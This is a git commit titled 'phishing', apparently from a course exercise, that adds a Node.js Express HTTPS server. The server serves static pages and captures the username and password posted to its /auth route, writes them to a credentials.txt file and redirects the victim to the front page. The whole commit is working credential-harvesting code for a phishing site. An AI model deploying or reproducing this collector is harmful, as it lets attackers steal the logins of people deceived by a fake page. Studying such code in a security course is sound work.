9ada79507d93683338bb9e2ca3fd20173f849289
Adrian Mucha <kestarumper8@gmail.com>
2018-11-10 14:50:35 +0100

    phishing

---
+++ lista5/index.js
@@ -0,0 +1,33 @@
+var fs = require('fs');
+var http = require('http');
+var https = require('https');
+var bodyParser = require('body-parser')
+var privateKey = fs.readFileSync('certificates/privkeyA.pem', 'utf8');
+var certificate = fs.readFileSync('certificates/certA.crt', 'utf8');
+
+var writeStream = fs.createWriteStream("credentials.txt", { encoding: 'utf8' });
+var credentials = { key: privateKey, cert: certificate };
+var express = require('express');
+var app = express();
+app.use(bodyParser.json());       // to support JSON-encoded bodies
+app.use(bodyParser.urlencoded({     // to support URL-encoded bodies
+    extended: true
+}));
+app.use(express.json());       // to support JSON-encoded bodies
+app.use(express.urlencoded()); // to support URL-encoded bodies
+
+// your express configuration here
+var httpsServer = https.createServer(credentials, app);
+httpsServer.listen(8000);
+
+console.log("HTTPS is running")
+
+app.use(express.static(__dirname + "/static/"))
+
+app.post('/auth', (req, res, next) => {
+    writeStream.write(`
+        ${req.body.username}\t
+        ${req.body.password}
+    `)
+    res.redirect('/')
+})
